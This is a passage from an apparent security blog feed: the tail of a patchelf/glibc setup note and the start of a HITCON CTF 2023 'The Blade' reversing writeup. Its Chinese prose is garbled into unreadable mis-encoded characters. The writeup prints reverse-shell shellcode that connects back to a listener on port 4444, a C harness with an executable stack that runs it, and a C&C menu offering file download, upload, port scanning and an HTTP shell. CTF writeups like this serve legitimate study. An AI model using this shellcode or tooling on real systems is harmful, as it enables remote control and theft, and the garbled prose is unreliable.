Josefsson</span><br></pre></td></tr></table></figure></div>å¾ä¸Šé¢å¯ä»¥å¾—çŸ¥ç‰ˆæœ¬æ˜¯ï¼š<code>2.23-0ubuntu5</code>ã€‚</li><li>æ¥è‘—æˆ‘å€‘è¦ç”¨ glibc-all-in-one å»æ‰¾åˆ°å°æ‡‰ç‰ˆæœ¬éœ€è¦çš„æ–‡ä»¶ï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ <span class="built_in">cd</span> glibc-all-in-one/</span><br><span class="line">â””â”€$ ./update_list</span><br><span class="line">â””â”€$ <span class="built_in">cat</span> list</span><br></pre></td></tr></table></figure></div>çœ‹äº†ä¸€ä¸‹æœƒç™¼ç¾ list æ²’æœ‰æˆ‘å€‘è¦çš„ç‰ˆæœ¬ï¼Œå¯ä»¥åœ¨ <a class="link"   href="https://launchpad.net/ubuntu/+source/glibc" >https://launchpad.net/ubuntu/+source/glibc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> æ‰¾ï¼Œæˆ–æ˜¯ç›´æ¥æ‰“å°æ‡‰ç‰ˆæœ¬çš„ç¶²å€ <a class="link"   href="https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu5" >https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu5 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ã€‚<br>å³å´çš„ <code>Builds</code> è£¡é¢æ‰¾åˆ°è£¡é¢æ‰¾åˆ°é¡Œç›®ä½¿ç”¨çš„ CPU æ¶æ§‹ã€‚<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ file dubblesort</span><br><span class="line">dubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter ./ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped</span><br></pre></td></tr></table></figure></div>é€™é¡Œç‚º <code>Intel 80386</code>ã€‚<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ <span class="built_in">cd</span> ~/glibc-all-in-one/debs</span><br><span class="line">â””â”€$ wget http://launchpadlibrarian.net/293727477/libc6_2.23-0ubuntu5_i386.deb</span><br><span class="line">â””â”€$ <span class="built_in">mkdir</span> ~/glibc-all-in-one/libs/2.23-0ubuntu5_i386</span><br><span class="line">â””â”€$ <span class="built_in">cd</span> ~/glibc-all-in-one/ </span><br><span class="line">â””â”€$ ./extract debs/libc6_2.23-0ubuntu5_i386.deb libs/2.23-0ubuntu5_i386</span><br><span class="line">â””â”€$ <span class="built_in">cd</span> ~/glibc-all-in-one/libs/2.23-0ubuntu5_i386</span><br></pre></td></tr></table></figure></div>é‚£å¦‚æœ list æœ‰ä½ æƒ³è¦çš„ç‰ˆæœ¬å¯ä»¥ç›´æ¥å¦‚ä¸‹æ“ä½œï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./download 2.23-0ubuntu11.3_amd64</span><br></pre></td></tr></table></figure></div>ä¸€æ¨£æœƒåœ¨ <code>~/glibc-all-in-one/libs</code> ä¸‹çœ‹åˆ°å°æ‡‰çš„è³‡æ–™å¤¾ã€‚</li><li><code>ldd</code>:<br>å…¨åæ˜¯ï¼šList Dynamic Dependenciesã€‚å¯ä»¥æŸ¥çœ‹ä¸€å€‹ç¨‹å¼åœ¨é‹è¡Œæ™‚éœ€è¦éˆæ¥çš„æ‰€æœ‰å…±äº«å‡½å¼åº«ã€‚ç”¨æ³•å¦‚ä¸‹ï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ldd dubblesort</span><br><span class="line">        linux-gate.so.1 (0xf7f9e000)</span><br><span class="line">        libc.so.6 =&gt; /lib32/libc.so.6 (0xf7c00000)</span><br><span class="line">        /lib/ld-linux.so.2 (0xf7fa0000)</span><br></pre></td></tr></table></figure></div>å¯ä»¥çœ‹åˆ°ç›®å‰éƒ½æ˜¯ç”¨åˆ°æœ¬åœ° <code>/lib32</code> é‚„æœ‰ <code>/lib</code> ä¸‹çš„æª”æ¡ˆ ï¼Œæˆ‘å€‘å¯ä»¥åœ¨ <code>patchelf</code> å¾Œä¾†è§€å¯Ÿä¸€ä¸‹è®ŠåŒ–ã€‚</li><li><code>patchelf</code>ï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ <span class="built_in">cp</span> /home/kazma/glibc-all-in-one/libs/2.23-0ubuntu5_i386/ld-2.23.so  ./</span><br><span class="line">â””â”€$ patchelf --set-interpreter ./ld-2.23.so dubblesort</span><br><span class="line">â””â”€$ patchelf --replace-needed libc.so.6 ./libc_32.so.6 dubblesort</span><br><span class="line">â””â”€$ ldd dubblesort</span><br><span class="line">        linux-gate.so.1 (0xf7fba000)</span><br><span class="line">        ./libc_32.so.6 (0xf7df7000)</span><br><span class="line">        ./ld-2.23.so =&gt; /lib/ld-linux.so.2 (0xf7fbc000)</span><br></pre></td></tr></table></figure></div></li><li>æˆåŠŸåŸ·è¡Œï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./dubblesort</span><br><span class="line">What your name :</span><br></pre></td></tr></table></figure></div>ä»¥ä¸Šæ˜¯æ¨¡æ“¬é ç«¯ç’°å¢ƒçš„ä¸€å€‹ç°¡å–®ç¤ºç¯„ï¼Œä¹‹å¾Œæœ‰é‡åˆ°å…¶ä»–ç‰¹æ®Šç‹€æ³æœƒæŒçºŒæ›´æ–°åœ¨é€™é‚Šï¼Œæœ‰å•é¡Œä¹Ÿæ­¡è¿æ‰¾æˆ‘è¨è«– ~</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Patchelf-Glibc-all-in-one-Combo&quot;&gt;&lt;a href=&quot;#Patchelf-Glibc-all-in-one-Combo&quot; class=&quot;headerlink&quot; title=&quot;Patchelf &amp;amp; Glibc-all-in-on</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
    
    <category term="notes" scheme="https://kazma.tw/tags/notes/"/>
    
    <category term="binary" scheme="https://kazma.tw/tags/binary/"/>
    
  </entry>
  
  <entry>
    <title>HITCON-CTF-2023 Full Chain - The Blade Writeup</title>
    <link href="https://kazma.tw/2024/02/19/HITCON-CTF-2023-Full-Chain-The-Blade-Writeup/"/>
    <id>https://kazma.tw/2024/02/19/HITCON-CTF-2023-Full-Chain-The-Blade-Writeup/</id>
    <published>2024-02-18T17:44:30.000Z</published>
    <updated>2024-03-24T20:59:51.465Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HITCON-CTF-2023-Full-Chain-The-Blade"><a href="#HITCON-CTF-2023-Full-Chain-The-Blade" class="headerlink" title="HITCON-CTF-2023 - Full Chain - The Blade"></a>HITCON-CTF-2023 - Full Chain - The Blade</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>A Rust tool for executing shellcode in a seccomp environment. Your goal is to pass the hidden flag checker concealed in the binary.<br>(Hey, this is my first Rust project. Feel free to give me any advice and criticism ğŸ˜ƒ)</p></blockquote><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   href="https://github.com/hitconctf/ctf2023.hitcon.org/releases/download/v1.0.0/blade-4c2ff1b60902623f702f0245a6a9ea0e71eeb385" >https://github.com/hitconctf/ctf2023.hitcon.org/releases/download/v1.0.0/blade-4c2ff1b60902623f702f0245a6a9ea0e71eeb385 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>ä¾‹è¡Œæª¢æŸ¥ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ file blade</span><br><span class="line">blade: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0c08e0f6f802d4a18151f338c9aab85e8b8f66d3, <span class="keyword">for</span> GNU/Linux 4.4.0, with debug_info, not stripped</span><br></pre></td></tr></table></figure></div><p>åŸ·è¡Œçœ‹çœ‹ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./blade</span><br><span class="line">&gt; <span class="built_in">test</span></span><br><span class="line">[-] Unknown <span class="built_in">command</span> <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">    Core Commands</span><br><span class="line">    =============</span><br><span class="line"></span><br><span class="line">        Command       Description</span><br><span class="line">        -------       -----------</span><br><span class="line">        <span class="built_in">help</span>          Help menu</span><br><span class="line">        server        Establish C&amp;C server</span><br><span class="line">        <span class="built_in">exit</span>          Exit program</span><br></pre></td></tr></table></figure></div><p>å¯ä»¥çœ‹åˆ°æä¾›ä¸‰å€‹åŠŸèƒ½ï¼Œä¸é <code>help</code> è·Ÿ <code>exit</code> æ²’ä»€éº¼ç‰¹åˆ¥çš„ï¼Œæˆ‘å€‘è©¦è©¦ <code>server</code>:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">    Core Commands</span><br><span class="line">    =============</span><br><span class="line"></span><br><span class="line">        Command                Description</span><br><span class="line">        -------                -----------</span><br><span class="line">        options                List all options</span><br><span class="line">        <span class="built_in">set</span> &lt;option&gt; &lt;value&gt;   Set option</span><br><span class="line">        run                    Start server</span><br><span class="line">        close                  Close server</span><br><span class="line">        back                   Back to menu</span><br><span class="line">server&gt; options</span><br><span class="line"></span><br><span class="line">    Options</span><br><span class="line">    =======</span><br><span class="line"></span><br><span class="line">        Option        Value           Description</span><br><span class="line">        ------        -----           -----------</span><br><span class="line">        host          127.0.0.1       Server host</span><br><span class="line">        port          4444            Server port</span><br><span class="line">        format        quoted          Shellcode format</span><br><span class="line">        read_syscall  SYS_read        Read syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Available Syscalls</span><br><span class="line">    ==================</span><br><span class="line"></span><br><span class="line">        Verb          Syscalls</span><br><span class="line">        ----          --------</span><br><span class="line">        read_syscall  SYS_read, SYS_recvfrom</span><br><span class="line"></span><br><span class="line">    Shellcode Formats</span><br><span class="line">    ==================</span><br><span class="line"></span><br><span class="line">        Format        Example</span><br><span class="line">        -------       -------</span><br><span class="line">        quoted        <span class="string">&quot;\xde\xad\xbe\xef&quot;</span></span><br><span class="line">        hex           deadbeef</span><br></pre></td></tr></table></figure></div><p>çœ‹èµ·ä¾†é€™å€‹ <code>server</code> æ¨¡å¼å°±æ˜¯å‰›å‰›é¡Œç›®æ•˜è¿°æåˆ°çš„ <code>seccomp environment</code>ï¼Œä¸¦ä¸”å¯ä»¥è¨­å®šä¸€äº›ç›¸é—œåƒæ•¸ã€‚<br>Start server çœ‹çœ‹:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./blade</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br></pre></td></tr></table></figure></div><p>Start ä¹‹å¾Œå¯ä»¥çœ‹åˆ°ä»–è¦æˆ‘å€‘åœ¨å—å®³è€…çš„é›»è…¦ä¸ŠåŸ·è¡Œä¸€æ®µ shellcodeï¼Œç„¶å¾Œåœ¨ <code>127.0.0.1:4444</code> æœ‰æœå‹™ç­‰å¾…é€£æ¥ã€‚<br>ç›´æ¥ nc ä¸Šå»åŸ·è¡ŒæŒ‡ä»¤æœƒå™´ä¸€å †äº‚ç¢¼ï¼Œç„¶å¾Œé‚„æœƒå¡ä½ï¼Œæ„Ÿè¦ºä¸å¤ªåƒæ˜¯æ­£å¸¸çš„äº¤äº’ï¼Œæˆ‘åœ¨åŒä¸€å€‹è³‡æ–™å¤¾ä¸‹é¢å»ºä¸€å€‹ shellcode.c ä¾†åŸ·è¡Œé€™æ®µ shellcodeï¼Œæ³¨æ„åœ¨ compile çš„æ™‚å€™è¦é—œæ‰ NXï¼š</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span>;</span><br><span class="line">    ((<span class="type">void</span> (*)())(shellcode))();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc shellcode.c -o shellcode -z execstack</span></span><br></pre></td></tr></table></figure></div><p>åŸ·è¡Œå¾Œå°±æœƒæ‹¿åˆ° reverse shell äº†ï¼ŒæŒ‡ä»¤ä¹Ÿéƒ½å¯ä»¥æ­£å¸¸åŸ·è¡Œ:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./blade</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br><span class="line">[+] Connection established from 127.0.0.1:43654</span><br><span class="line">$ <span class="built_in">test</span></span><br><span class="line">[-] Unknown <span class="built_in">command</span> <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line">    Core Commands</span><br><span class="line">    =============</span><br><span class="line"></span><br><span class="line">        Command                    Description                                    Syscalls</span><br><span class="line">        -------                    -------                                        -----------</span><br><span class="line">        <span class="built_in">help</span>                       Print This Menu                                N/A</span><br><span class="line">        <span class="built_in">ls</span> [DIR]                   List Directory                                 SYS_open, SYS_getdents</span><br><span class="line">        <span class="built_in">dir</span> [DIR]                  List Directory                                 SYS_open, SYS_getdents</span><br><span class="line">        <span class="built_in">cat</span> &lt;FILE&gt;                 Print File Content                             SYS_open, SYS_close</span><br><span class="line">        <span class="built_in">cd</span> &lt;DIR&gt;                   Change Directory                               SYS_chdir</span><br><span class="line">        <span class="built_in">pwd</span>                        Print Current Directory                        SYS_getcwd</span><br><span class="line">        download &lt;FILE&gt;            Download File                                  SYS_open, SYS_close</span><br><span class="line">        upload &lt;FILE&gt; [PERM]       Upload File                                    SYS_open, SYS_close</span><br><span class="line">        <span class="built_in">rm</span> &lt;FILE&gt;                  Remove File                                    SYS_unlink</span><br><span class="line">        <span class="built_in">mv</span> &lt;SOURCE&gt; &lt;DEST&gt;         Move File                                      SYS_rename</span><br><span class="line">        <span class="built_in">cp</span> &lt;SOURCE&gt; &lt;DEST&gt; [PERM]  Copy File                                      SYS_open, SYS_close</span><br><span class="line">        <span class="built_in">mkdir</span> &lt;DIR&gt; [PERM]         Create a Directory                             SYS_mkdir</span><br><span class="line">        <span class="built_in">rmdir</span> &lt;DIR&gt;                Remove a Directory                             SYS_rmdir</span><br><span class="line">        getuid                     Get Current UID                                SYS_getuid</span><br><span class="line">        getgid                     Get Current GID                                SYS_getgid</span><br><span class="line">        portscan                   Scan Ports on localhost                        SYS_socket, SYS_setsockopt, SYS_connect, SYS_close</span><br><span class="line">        netcat &lt;INPUT_FILE&gt; &lt;Port&gt; Send Data <span class="keyword">in</span> the Input File to Port            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close</span><br><span class="line">                                   and Receive Output</span><br><span class="line">        http-shell                 HTTP Interactive Shell                         SYS_socket, SYS_setsockopt, SYS_connect, SYS_close</span><br><span class="line">        redis-cli                  Simple Redis Client                            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close</span><br><span class="line">        <span class="built_in">exit</span>                       Exit shell                                     N/A</span><br><span class="line">        quit                       Exit shell                                     N/A</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[+] Listing directory <span class="string">&#x27;.&#x27;</span></span><br><span class="line">shellcode.c</span><br><span class="line">blade</span><br><span class="line">shellcode</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><p>çœ‹äº† menu ä¹‹å¾Œæ²’çœ‹åˆ°ä»»ä½•è·Ÿ flag checker æœ‰é—œçš„æŒ‡ä»¤ï¼Œæˆ‘å€‘å†å›æ†¶ä¸€ä¸‹é¡Œç›®æ•˜è¿°ï¼š</p><blockquote><p>Your goal is to pass the hidden flag checker concealed in the binary.</p></blockquote><p>ä¸Šé¢çš„ç¿»è­¯æ˜¯ï¼šè©²é–‹ IDA äº† XD</p><h2 id="0x2-Reverse-Engineering"><a href="#0x2-Reverse-Engineering" class="headerlink" title="0x2 Reverse Engineering"></a>0x2 Reverse Engineering</h2><p>ä¸Ÿé€² IDA å¾Œåœ¨ <code>Function name</code> é€›äº†ä¸€ä¸‹å¾Œæœƒçœ‹åˆ°å‰›å‰› server æ¨¡å¼çš„é‚£äº›æŒ‡ä»¤ï¼Œè€Œé€™é‚Šå‡½å¼åå‰ç¶´ç‚º <code>seccomp_shell</code> ä¹Ÿç¬¦åˆæˆ‘å€‘çš„çŒœæ¸¬ï¼Œå…¶ä¸­æœ‰å€‹å¯ç–‘çš„ <code>verify()</code> å‡½å¼ï¼Œæ„Ÿè¦ºè »å¯èƒ½è·Ÿ flag checker æœ‰é—œè¯ï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blade_verify.png"                      alt="verify"                ><br>ä½†åˆ†æ <code>verify()</code> å‰ï¼Œæˆ‘å€‘å…ˆæ‰¾åˆ°å‘¼å« <code>verify()</code> çš„åœ°æ–¹ï¼Œé€™æ¨£æ–¹ä¾¿æˆ‘å€‘é€éå‚³å…¥çš„åƒæ•¸å»æ¨ç†é€†å‘ï¼Œä¹Ÿæœ‰æ©Ÿæœƒæ‰¾åˆ°ä»–ç”¨ä¾†æª¢æŸ¥ flag çš„æŒ‡ä»¤ï¼Œé‚£ <code>prompt()</code> æ„Ÿè¦ºå°±æ˜¯åœ¨åšç®¡ç†æ•´å€‹ <code>seccomp_shell</code> ä¹‹é¡çš„åŠŸèƒ½ï¼Œæˆ‘å€‘å¾é€™è£¡å…ˆé–‹å§‹åˆ†æã€‚</p><h3 id="prompt"><a href="#prompt" class="headerlink" title="prompt()"></a>prompt()</h3><p><code>void ***__fastcall seccomp_shell::shell::prompt::h76cecfe7bd3bdf50(__int64 a1)</code><br>æ¥æ”¶äº†ä¸€å€‹åƒæ•¸æ‡‰è©²å°±æ˜¯æŒ‡ä»¤ï¼Œæˆ‘å€‘é‡æ–°å‘½åæ•´ç†ä¸€ä¸‹ï¼š<br><code>a1 -&gt; inputCommand</code><br>æ¥è‘—ç™¼ç¾æŒ‡ä»¤å‘¼å«æ™‚å‚³å…¥çš„ç¬¬ä¸€å€‹åƒæ•¸éƒ½æ˜¯ <code>v162</code>ï¼Œè€Œä¸” <code>v162</code> å°±æ˜¯å‰›å‰›çš„ <code>a1</code>ï¼Œæ‰€ä»¥çµ¦ä»–å€‹æ–°åå­—ï¼š<br><code>v162 -&gt; commandString</code><br>å†ä¾†å°±å¤§æ¦‚èŠ±äº†å„„é»æ™‚é–“åœ¨å°‹æ‰¾ç”¨ä¾†è§¸ç™¼ <code>verify()</code> çš„æŒ‡ä»¤ï¼Œçœ‹äº†å¾ˆä¹…éƒ½æ²’å•¥é€²å±•çš„åŒæ™‚æ±ºå®šå‡ºé–€åƒå€‹æ™šé¤ï¼Œå›ä¾†ç™¼ç¾å­¸é•·æŠŠé›»è…¦é‡é–‹æ©Ÿï¼ˆRDP åˆ°ç¤¾åœ˜çš„å…¬å…±é›»è…¦ï¼‰ï¼ŒIDA åªå¥½é‡æ–°è§£ä¸€æ¬¡ï¼Œæ²’æƒ³åˆ°è§£å®Œå¾Œå°±æ­£å¸¸å¤šäº†ï¼Œå¦‚ä¸‹ï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blade_flag.png"                      alt="flag"                ><br>çœ‹åˆ°é€™æ¬¡ä»–æŠŠä»–è§£æˆ switchï¼Œç„¶å¾Œ case çœ‹èµ·ä¾†åƒæ˜¯ ASCII çš„å­—ä¸²ï¼Œå°å­—ä¸²æŒ‰ r ä¹‹å¾Œå¯ä»¥çœ‹åˆ° little endian çš„ <code>flag</code>ã€<code>exit</code> å’Œ <code>quit</code> ç­‰æŒ‡ä»¤ï¼Œæ¸¬è©¦ä¸€ä¸‹ <code>flag</code> æŒ‡ä»¤ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ flag hitcon&#123;flag&#125;</span><br><span class="line">[-] Incorrect</span><br></pre></td></tr></table></figure></div><p>çœ‹èµ·ä¾†å¾ˆå°ï¼Œå·®ä¸å¤šè©²åˆ†æ <code>verify()</code> äº†ã€‚</p><h3 id="verify"><a href="#verify" class="headerlink" title="verify()"></a>verify()</h3><ol><li>ä¸€é€²å»å°±æœƒçœ‹åˆ°å¯èƒ½æ˜¯åœ¨æª¢æŸ¥ flag é•·åº¦çš„åˆ¤æ–·å¼ï¼š<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( len != <span class="number">64</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _$LT$alloc..boxed..Box$LT$dyn$u20$core..error..Error$GT$$u20$as$u20$core..convert..From$LT$$RF$str$GT$$GT$::from::<span class="built_in">hc50629fd4c285201</span>();</span><br><span class="line">    <span class="keyword">return</span> v72;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div></li><li>æ¥è‘—æ˜¯ä¸€äº›ä¸å¤ªé‡è¦çš„è®Šæ•¸ï¼Œé€™è£¡å®ƒæŠŠ flag åˆ‡æˆä¸‰æ®µï¼š<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">commandString = command;</span><br><span class="line">_rust_alloc();</span><br><span class="line"><span class="keyword">if</span> ( !flag_copy )</span><br><span class="line">  alloc::alloc::handle_alloc_error::<span class="built_in">hd36006f171acb99e</span>();</span><br><span class="line">flag_copy2 = flag_copy;</span><br><span class="line">flag_ptr = *flag;</span><br><span class="line">flag_part1 = flag[<span class="number">1</span>];</span><br><span class="line">flag_part2 = flag[<span class="number">2</span>];</span><br><span class="line">flag_copy[<span class="number">3</span>] = flag[<span class="number">3</span>];</span><br><span class="line">flag_copy[<span class="number">2</span>] = flag_part2;</span><br><span class="line">flag_copy[<span class="number">1</span>] = flag_part1;</span><br><span class="line">*flag_copy = flag_ptr;</span><br><span class="line">flag_copy3 = flag_copy;</span><br><span class="line">v88 = <span class="number">64LL</span>;</span><br><span class="line">v89 = <span class="number">64LL</span>;</span><br></pre></td></tr></table></figure></div></li><li>å†ä¾†åŒ…å«ä¸€å€‹é‡è¤‡ 256 æ¬¡çš„å¤–éƒ¨å¾ªç’°ï¼Œå…§éƒ¨ç”±å…«å€‹ä¸€æ¨£çš„å­å¾ªç’°çµ„æˆï¼Œå­å¾ªç’°æœƒä»¥ <code>dest</code> åšç‚ºæ˜ å°„è¡¨ï¼Œå° flag å…§çš„å­—ç¬¦é€²è¡Œäº¤æ›æ“ä½œï¼Œä¸¦ä¸”éç¨‹æ˜¯ç”± flag çš„å°¾éƒ¨é€²è¡Œåˆ°é ­éƒ¨ã€‚<br>æ­¤å¤– <code>core::panicking::panic_bounds_check::h7d0e683548e4cb10()</code>æ˜¯ rust 